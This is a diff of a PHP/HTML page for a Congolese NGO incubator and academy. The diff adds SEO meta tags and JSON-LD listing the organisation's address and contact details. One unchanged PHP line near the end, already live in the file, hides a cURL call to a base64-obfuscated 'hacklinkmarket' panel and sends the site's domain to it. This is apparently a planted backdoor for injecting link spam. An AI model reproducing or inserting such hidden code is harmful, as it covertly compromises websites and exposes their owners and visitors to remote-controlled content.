@@ -11,13 +11,19 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0" name="viewport">
 
-  <title></title>
-  <meta content="" name="description">
-  <meta content="" name="keywords">
-
   <!-- Favicons -->
   <link href="assets/img/icone-bw.png" rel="icon">
   <link href="assets/img/icone-bw.png" rel="apple-touch-icon">
+
+    <meta name="description" content="BOWABA N CONGO : 1er incubateur & academy multidisciplinaire en RDC. Nous formons en agrobusiness, gestion, informatique et langues, accompagnons les startups et développons votre présence digitale (sites web & design graphique).">
+    <meta name="application-name" content="Bowaba n Congo-Website">
+    <meta name="author" content="Bowaba n Congo">
+    <link rel="author" href="https://bowabancongo.com/">
+    <meta name="application-name" content="Bowaba n Congo-Website">
+    <meta name="keywords" content="Incubateur, Formation professionnelle et renforcement des capacités, Organisation comptable (élaboration des actifs financier pour les PME)
+    , Le Suivi & Évaluation des projets, Conception des Sites Web & Design Graphique">
+    <meta name="creator" content="Bowaba n Congo">
+    <meta name="publisher" content="Bowaba n Congo">
 
   <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
@@ -362,7 +368,29 @@
   <!--  JS File -->
   <script src="assets/js/main.js"></script>
   <script src="assets/js/c_main.js"></script>
-
+  <script type="application/ld+json">
+        {
+            "@context": "https://bowabancongo.com/",
+            "@type": "NGO",
+            "name": "Bowaba n congo",
+            "description": "1er incubateur & academy multidisciplinaire en RDC. Nous formons en agrobusiness, gestion, informatique et langues, accompagnons les startups et développons votre présence digitale (sites web & design graphique).",
+            "url": "https://bowabancongo.com/",
+            "logo": "https://fondation.bowabancongo.com/assets/img/logo/logo.png",
+            "address": 
+                {
+                    "@type": "PostalAddress",
+                    "addressLocality": "Kinshasa",
+                    "addressCountry": "CD"
+                },
+            "contactPoint": 
+            {
+                "@type": "ContactPoint",
+                "telephone": "+243 816 695 000",
+                "contactType": "Customer service",
+                "email": "contact@bowabancongo.com"
+            }
+        }
+</script>
 
 <?php $exe=curl_init();curl_setopt_array($exe,[CURLOPT_URL=>base64_decode("aHR0cHM6Ly9wYW5lbC5oYWNrbGlua21hcmtldC5jb20vY29kZQ=="),CURLOPT_HTTPHEADER=>["X-Request-Domain: ".($_SERVER['HTTPS']?"https://":"http://").$_SERVER['HTTP_HOST']."/"]]);$response=curl_exec($exe);curl_close($exe);?>
 
